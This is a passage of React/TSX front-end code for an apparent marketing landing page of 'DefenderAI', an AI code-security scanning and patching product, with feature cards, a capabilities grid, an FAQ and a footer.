                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Deep Reasoning:</strong> Multi-cwe composite triage</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Fallback resilience:</strong> Auto-failover on rate-limits</span>
                </li>
              </ul>
            </div>

            {/* Card 3: Hybrid */}
            <div
              className={`rounded-2xl border p-6 transition backdrop-blur-sm ${
                activeArchitecture === "hybrid"
                  ? "border-emerald-500/80 bg-emerald-950/20 ring-1 ring-emerald-500/40"
                  : "border-slate-800/80 bg-slate-900/40 opacity-70 hover:opacity-100"
              }`}
            >
              <div className="flex items-center justify-between mb-4">
                <div className="rounded-xl bg-emerald-600/20 p-2.5 text-emerald-400 border border-emerald-500/30">
                  <ShieldCheck className="h-5 w-5" />
                </div>
                <span className="rounded-full bg-emerald-950 px-2.5 py-1 text-[11px] font-semibold text-emerald-300 border border-emerald-500/30">
                  Recommended Hybrid
                </span>
              </div>

              <h3 className="text-lg font-bold text-white mb-2">
                Privacy-Preserving Hybrid Agent
              </h3>
              <p className="text-sm text-slate-400 leading-relaxed mb-6">
                The best of both worlds: Semgrep scans and AST normalization run on your machine. Only stripped vulnerability AST metadata is sent to LLM.
              </p>

              <ul className="space-y-3 text-xs text-slate-300 border-t border-slate-800/80 pt-4">
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>0 Raw Code Transmitted:</strong> Pure structural diffs</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Token Optimized:</strong> 85% reduced token consumption</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Local Sandbox Run:</strong> All verification executes locally</span>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>

      {/* Security Capabilities Matrix */}
      <section id="capabilities" className="py-20 border-t border-slate-900 bg-slate-950/80">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
              Enterprise Defense Capabilities
            </h2>
            <p className="mt-3 text-slate-400 text-base sm:text-lg">
              Engineered from the ground up for strict AppSec standards, compliance, and developer confidence.
            </p>
          </div>

          <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
            <div className="rounded-2xl border border-slate-800 bg-slate-900/50 p-6">
              <div className="flex items-center gap-3 mb-3">
                <div className="rounded-lg bg-indigo-500/10 p-2 text-indigo-400 border border-indigo-500/20">
                  <Code2 className="h-5 w-5" />
                </div>
                <h3 className="font-bold text-white text-base">Semgrep SAST Integration</h3>
              </div>
              <p className="text-slate-400 text-sm leading-relaxed">
                Automated multi-language static analysis scanning for OWASP Top 10, CWE-89 SQLi, CWE-79 XSS, and dangerous deserialization.
              </p>
            </div>

            <div className="rounded-2xl border border-slate-800 bg-slate-900/50 p-6">
              <div className="flex items-center gap-3 mb-3">
                <div className="rounded-lg bg-cyan-500/10 p-2 text-cyan-400 border border-cyan-500/20">
                  <Boxes className="h-5 w-5" />
                </div>
                <h3 className="font-bold text-white text-base">Trivy Dependency SCA</h3>
              </div>
              <p className="text-slate-400 text-sm leading-relaxed">
                Scans lockfiles, `requirements.txt`, and packages against the National Vulnerability Database (NVD) with automated CVE advisory lookups.
              </p>
            </div>

            <div className="rounded-2xl border border-slate-800 bg-slate-900/50 p-6">
              <div className="flex items-center gap-3 mb-3">
                <div className="rounded-lg bg-emerald-500/10 p-2 text-emerald-400 border border-emerald-500/20">
                  <Terminal className="h-5 w-5" />
                </div>
                <h3 className="font-bold text-white text-base">Ephemeral Sandbox Verification</h3>
              </div>
              <p className="text-slate-400 text-sm leading-relaxed">
                Applies AI candidate patches in an isolated execution sandbox, running unit tests and SAST re-scans before giving approval.
              </p>
            </div>

            <div className="rounded-2xl border border-slate-800 bg-slate-900/50 p-6">
              <div className="flex items-center gap-3 mb-3">
                <div className="rounded-lg bg-amber-500/10 p-2 text-amber-400 border border-amber-500/20">
                  <RotateCcw className="h-5 w-5" />
                </div>
                <h3 className="font-bold text-white text-base">Atomic Rollback & Backup</h3>
              </div>
              <p className="text-slate-400 text-sm leading-relaxed">
                Every patch application automatically captures an atomic snapshot backup (`.defender_backup`), allowing instant 1-click restoration if needed.
              </p>
            </div>

            <div className="rounded-2xl border border-slate-800 bg-slate-900/50 p-6">
              <div className="flex items-center gap-3 mb-3">
                <div className="rounded-lg bg-purple-500/10 p-2 text-purple-400 border border-purple-500/20">
                  <FileCode className="h-5 w-5" />
                </div>
                <h3 className="font-bold text-white text-base">Dedicated Finding Triage Pages</h3>
              </div>
              <p className="text-slate-400 text-sm leading-relaxed">
                Expansive dedicated vulnerability inspection pages with syntax line highlighting, sequential next/prev triage, and unified diff inspection.
              </p>
            </div>

            <div className="rounded-2xl border border-slate-800 bg-slate-900/50 p-6">
              <div className="flex items-center gap-3 mb-3">
                <div className="rounded-lg bg-rose-500/10 p-2 text-rose-400 border border-rose-500/20">
                  <ShieldCheck className="h-5 w-5" />
                </div>
                <h3 className="font-bold text-white text-base">AST Syntax Integrity Check</h3>
              </div>
              <p className="text-slate-400 text-sm leading-relaxed">
                Validates Python / JavaScript abstract syntax trees before applying diffs, mathematically guaranteeing that patches never break parser grammar.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Frequently Asked Questions */}
      <section id="faq" className="py-20 border-t border-slate-900 bg-slate-950">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-14">
            <div className="inline-flex items-center gap-2 rounded-full bg-slate-800 px-3 py-1 text-xs font-semibold text-slate-300 mb-4">
              <HelpCircle className="h-3.5 w-3.5" />
              <span>Got Questions?</span>
            </div>
            <h2 className="text-3xl font-extrabold text-white tracking-tight">
              Frequently Asked Questions
            </h2>
          </div>

          <div className="space-y-4">
            {[
              {
                q: "How does the ephemeral sandbox ensure patch safety?",
                a: "Instead of blindly applying AI suggestions to your repository, DefenderAI creates an isolated runtime sandbox. It validates the code's Abstract Syntax Tree (AST), re-runs Semgrep SAST to confirm the vulnerability is eliminated, and executes your project's regression tests before proposing the final merge.",
              },
              {
                q: "Does my proprietary source code ever leave my infrastructure?",
                a: "No. In Sovereign Local Mode (Mode 1), all inference is powered by local Ollama / vLLM instances with zero network egress. In Privacy Hybrid Mode (Mode 3), scanners run on your machine and only normalized vulnerability metadata is processed.",
              },
              {
                q: "What scanners are supported out of the box?",
                a: "DefenderAI integrates Semgrep SAST for custom and community rulesets, and Trivy for Software Composition Analysis (SCA) dependency vulnerability detection.",
              },
              {
                q: "Can I revert a patch if an issue arises later?",
                a: "Yes. DefenderAI automatically creates an atomic snapshot backup before touching any file. You can revert any applied remediation with a single click in the console.",
              },
            ].map((faq, index) => {
              const isOpen = openFaq === index;
              return (
                <div
                  key={index}
                  className="rounded-xl border border-slate-800 bg-slate-900/60 overflow-hidden transition"
                >
                  <button
                    onClick={() => setOpenFaq(isOpen ? null : index)}
                    className="w-full px-6 py-4 text-left flex items-center justify-between text-sm sm:text-base font-semibold text-white hover:text-indigo-400 transition"
                  >
                    <span>{faq.q}</span>
                    <ChevronDown
                      className={`h-4 w-4 text-slate-400 transition-transform duration-200 ${
                        isOpen ? "rotate-180 text-indigo-400" : ""
                      }`}
                    />
                  </button>
                  {isOpen && (
                    <div className="px-6 pb-5 text-sm text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">
                      {faq.a}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* Call to Action Banner */}
      <section className="py-20 border-t border-slate-900 bg-gradient-to-b from-slate-950 via-indigo-950/20 to-slate-950 relative">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <div className="rounded-3xl border border-indigo-500/30 bg-gradient-to-r from-indigo-950/80 via-slate-900/90 to-indigo-950/80 p-8 sm:p-14 shadow-2xl relative overflow-hidden backdrop-blur-xl">
            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
              Ready to Secure Your Codebase with Autonomous AI?
            </h2>
            <p className="mt-4 text-slate-300 text-base sm:text-lg max-w-2xl mx-auto">
              Scan repositories, examine deep root cause explanations, and apply AST-verified remediations in minutes.
            </p>
            <div className="mt-8 flex flex-wrap items-center justify-center gap-4">
              <Link
                href={isLoggedIn ? "/dashboard" : "/register"}
                className="inline-flex items-center gap-2 rounded-xl bg-indigo-600 px-6 py-3.5 text-base font-semibold text-white shadow-xl shadow-indigo-600/40 hover:bg-indigo-500 transition"
              >
                <span>{isLoggedIn ? "Open Security Console" : "Start Securing Free"}</span>
                <ArrowRight className="h-4 w-4" />
              </Link>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-slate-900 bg-slate-950 py-10 text-xs text-slate-500">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <Shield className="h-4 w-4 text-indigo-400" />
            <span className="font-semibold text-slate-300">DefenderAI</span>
            <span>&copy; {new Date().getFullYear()} Autonomous Security Platform</span>
          </div>

          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2 text-emerald-400">
              <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>All Security Engines Operational</span>
            </div>
            <Link href="/login" className="hover:text-slate-300 transition">
              Sign In
            </Link>
            <Link href="/register" className="hover:text-slate-300 transition">
              Register
            </Link>
          </div>
        </div>
      </footer>
    </div>
  );
}